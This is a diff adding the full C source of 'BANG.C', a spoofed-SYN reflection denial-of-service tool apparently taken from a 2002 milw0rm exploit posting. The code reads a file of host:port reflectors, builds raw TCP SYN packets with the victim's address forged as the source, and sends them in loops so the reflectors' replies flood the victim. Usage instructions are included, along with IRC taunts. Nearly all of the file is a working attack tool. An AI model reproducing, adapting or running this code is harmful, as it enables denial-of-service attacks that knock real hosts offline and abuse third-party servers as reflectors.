@@ -1,0 +1,330 @@
+/* 
+ * BANG.C Coded by Sorcerer of DALnet
+ *
+ * FUCKZ to: etech, blazin, udp, hybrid and kdl
+ * PROPZ : skrilla, thanks for all your help with JUNO-Z and especially this code :)
+ *             -------------------------------- 
+ * REDIRECTION DOS FINALLY DISTRIBUTED !!!!!!
+ *
+ * This is POC and demonstrates a new method of DoS. The idea
+ * behind it is that the attacker generates connection requests
+ * to a list of hosts which have a TCP service running such as
+ * http (80), telnet (23) etc. from the ip of the victim host.
+ * This will result all of the hosts that the victim *requested*
+ * connections to send back packets (usually SYN-ACK's) 2-3 of
+ * them (amplification comes here!) causing load to the victim
+ * by cauzing the victim to send RST packets since it never actually
+ * requested any such connection. This attack is dangerous since
+ * its almost impossible to filter!!
+ *
+ * hosts file should be in the format of 1 ip:port per line
+ * i.e. 194.66.25.97:80
+ *      130.88.172.194:23
+ *      65.161.42.42:6667
+ * NOTE: target should only be ip, and all the hosts on the list should
+ * also be ips thats for speed issues.
+ * 
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#define __FAVOR_BSD
+
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+
+
+unsigned short int getrandportid(void);
+unsigned short in_cksum(u_short *addr, int len);
+short int send_syn(unsigned long int , unsigned long int, unsigned short int);
+int sox;
+
+struct pseudo {
+  unsigned long srca, dsta;
+  unsigned char zero, proto;
+  unsigned short tcplen;
+};
+
+struct checksum {
+  struct pseudo pp;
+  struct tcphdr tt;
+};
+
+/* Taken out since only works on x86 and rdtsc is also only pentium specific */
+#if 0
+/* Thanks to skrilla :) */
+unsigned short mktcpsum1(struct packet *p,int len) {
+  unsigned short old_sum = p->tcpsum;
+  unsigned long s = (unsigned long)&p->sport;
+  unsigned long sum = ((p->src >> 16) + (p->src & 0xffff) + (p->dst >> 16) +
+		       (p->dst & 0xffff) + (__htons__(6) + __htons__(len-20)));
+  
+  p->tcpsum=0;
+  __asm__ __volatile__ (
+			/*"xorl %%eax,%%eax;"
+			  "cmpl $2,%%ecx;"
+			  "jb 1f;"
+			  "0:;"
+			  "lodsw;"
+			  "addw %%ax,%%dx;"
+			  "jnc 9f;"
+			  "addl $65536,%%edx;"
+			  "9:;"
+			  "decl %%ecx;"
+			  "loop 0b;"
+			  "1:;"
+			  "orb %%cl,%%cl;"
+			  "jz 2f;"
+			  "xorw %%ax,%%ax;"
+			  "lodsb;"
+			  "addw %%ax,%%dx;"
+			  "jnz 2f;"
+			  "addl $65536,%%edx;"
+			  "2:;"
+			  "movw %%dx,%%ax;"
+			  "shrl $16,%%edx;"
+			  "addw %%ax,%%dx;"
+			  "adcl $0xffff0000,%%edx;"
+			  "xorw $65535,%%dx;"*/
+			
+			"movw %%dx,%%ax;"
+			"shrl $16,%%edx;"
+			"addw %%ax,%%dx;"
+			"adcw $0,%%dx;"
+			
+			"testl $1,%%ecx;"
+			"jz 0f;"
+			"xorw %%ax,%%ax;"
+			"lodsb;"
+			"addw %%ax,%%dx;"
+			"adcw $0,%%dx;"
+			"0:;"
+			"shrl $1,%%ecx;"
+			"1:;"
+			"lodsw;"
+			"addw %%ax,%%dx;"
+			"adcw $0,%%dx;"
+			"loop 1b;"
+			"andl $65535,%%edx;"
+			"xorw $65535,%%dx;"
+			
+			:"=edx"(sum):"edx"(sum),"ecx"(len-20),"S"(&p->sport):"eax");
+  p->tcpsum=old_sum;
+  return(sum);
+}
+
+unsigned long long int
+rdtsc(void) {
+  unsigned long long int tsc;
+  unsigned long int tsc_l,tsc_h;
+  __asm__ volatile("rdtsc":"=%eax"(tsc_l),"=d"(tsc_h));
+  tsc=tsc_h;
+  tsc=(tsc<<32)|tsc_l;
+  return(tsc);
+}
+#endif
+
+int
+main(int argc, char **argv)
+{
+  int                 enable=1,tmp,tmp2, loop, count=0;
+  char               *lala, *tmp1, buf[25];
+  unsigned long int   ip[1000000], src;
+  unsigned short int  port[1000000];
+  FILE               *fp;
+  struct timeval      start, end;
+
+  printf("\nCoded by Sorcerer of DALnet\n\n");
+  
+  if(argc != 4){
+    fprintf(stderr, "Incorrect usage try: %s <victim> <host-file> <loop host-file>\a\n", *argv);
+    fprintf(stderr, "Example:             %s 127.0.0.1 myhostsfile.txt 3\n\n", *argv);
+    return(-1);
+  }
+  
+  fp = fopen(argv[2], "r");
+  if(fp == NULL){
+    fprintf(stderr, "Error while opening: %s\n", argv[2]);
+    perror("fopen");
+    return(-1);
+  }
+  
+  loop = atoi(argv[3]);
+  if(loop == 0){
+    fprintf(stderr, "Cannot loop 0 times you need to loop at least once\n");
+    return(-1);
+  }
+  
+  for(tmp=0;tmp<=1000000;tmp++){
+    ip[tmp] = htons(23);
+    port[tmp] = htons(23);
+  }
+
+  sox = socket(PF_INET, SOCK_RAW, 6);
+  if(sox == -1){ perror("socket"); return(-1); }
+  
+  tmp = setsockopt(sox, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
+  if(tmp == -1){ perror("setsockopt"); return(-1); }
+
+    
+  printf("Reading ips on memory and reconstructing in network byte order...\n"); fflush(stdout);
+  
+  while(1){
+    memset(buf, 0, 25);
+
+    tmp1 = fgets(buf, 25, fp);
+    if(tmp1 == NULL) break;
+    
+    if(strlen(buf) < 9) {
+      printf("Bogus entry: %s\n", buf);
+      continue;
+    }
+    
+    lala = strchr((char *)&buf, ':');
+
+    port[count] = htons(atoi(++lala));
+
+    buf[strlen(buf)-strlen(lala)-1] = '\0';
+
+    ip[count] = inet_addr(buf);
+
+    count++;
+    printf("."); fflush(stdout);
+  }
+
+  printf("Done.\n");
+
+  src = inet_addr(argv[1]);
+
+  tmp = gettimeofday((struct timeval *)&start, NULL);
+  if(tmp == -1){ perror("gettimeofday"); return(-1); }
+  
+
+  for(tmp2=0;tmp2<loop;tmp2++)
+    for(tmp=0;tmp<count;tmp++)
+      send_syn(src, ip[tmp], port[tmp]);
+  
+
+  tmp = gettimeofday((struct timeval *)&end, NULL);
+  if(tmp == -1){ perror("gettimeofday"); return(-1); }
+  
+  printf("\nTotal time taken: %lu\nBytes sent: %d\n", (end.tv_sec+end.tv_usec)-(start.tv_sec+start.tv_usec), count*loop*sizeof(char)*sizeof(struct ip)*sizeof(struct tcphdr));
+  
+  return 0;
+}
+
+short int
+send_syn(unsigned long int src, unsigned long int dst, unsigned short int port)
+{
+  struct sockaddr_in  s;
+  struct ip           *i;
+  struct tcphdr       *t;
+  struct pseudo       p;
+  struct checksum     c;
+  char                packet[sizeof(char)*(sizeof(struct ip)+sizeof(struct tcphdr))];
+  int                 tmp;
+
+  s.sin_family       = PF_INET;
+  s.sin_port         = port;
+  s.sin_addr.s_addr  = dst;
+ 
+  i = (struct ip *)&packet;
+  t = (struct tcphdr *)((int)i+sizeof(struct ip));
+
+  memset(&packet, 0, sizeof(packet));
+
+  i->ip_hl         = 5;
+  i->ip_v          = 4;
+  i->ip_tos        = 0x08;
+  i->ip_len        = htons(sizeof(packet));
+  i->ip_id         = htons(getrandportid());
+  i->ip_off        = 0;
+  i->ip_ttl        = 255;
+  i->ip_p          = 6;
+  i->ip_sum        = 0;
+  i->ip_src.s_addr = src;
+  i->ip_dst.s_addr = dst;
+
+
+  t->th_sport = htons(getrandportid());
+  t->th_dport = port;
+  t->th_seq   = htons(getrandportid());
+  t->th_ack   = 0;
+  t->th_x2    = 0;
+  t->th_off   = 5;
+  t->th_flags = 0x02;
+  t->th_win   = 65535;
+  t->th_urp   = 0;
+  t->th_sum   = 0;
+
+  p.srca      = src;
+  p.dsta      = dst;
+  p.proto     = 6;
+  p.tcplen    = htons(sizeof(struct tcphdr));
+  p.zero      = 0;
+  
+  memcpy(&c.pp, &p, sizeof(p));
+  memcpy(&c.tt, t, sizeof(struct tcphdr));
+
+  t->th_sum    = in_cksum((void *)&c, sizeof(c));
+
+  tmp = sendto(sox, packet, ntohs(i->ip_len), MSG_DONTWAIT, (struct sockaddr *)&s, sizeof(s));
+  if(tmp == -1){
+    perror("sendto");
+    return(-1);
+  }
+
+  return 0;
+}
+
+unsigned short int
+getrandportid(void)
+{
+  unsigned short int port;
+  struct timeval tv;
+
+  gettimeofday((struct timeval *)&tv, NULL);
+  srand(tv.tv_sec+tv.tv_usec);
+
+  port = rand()+1;
+
+  return(port);
+}
+
+
+/* Slow shit checksum function from RFC */
+u_short 
+in_cksum(u_short *addr, int len)
+{
+  register int nleft = len;
+  register u_short *w = addr;
+  register int sum = 0;
+  u_short answer = 0;
+  
+  while (nleft > 1)  {
+    sum += *w++;
+    nleft -= 2;
+  }
+  
+  
+  if (nleft == 1) {
+    *(u_char *)(&answer) = *(u_char *) w;
+    sum += answer;
+  }
+  
+  sum = (sum >> 16) + (sum & 0xffff);
+  sum += (sum >> 16);
+  answer = ~sum;
+  return(answer);
+}
+
+// milw0rm.com [2002-09-17]
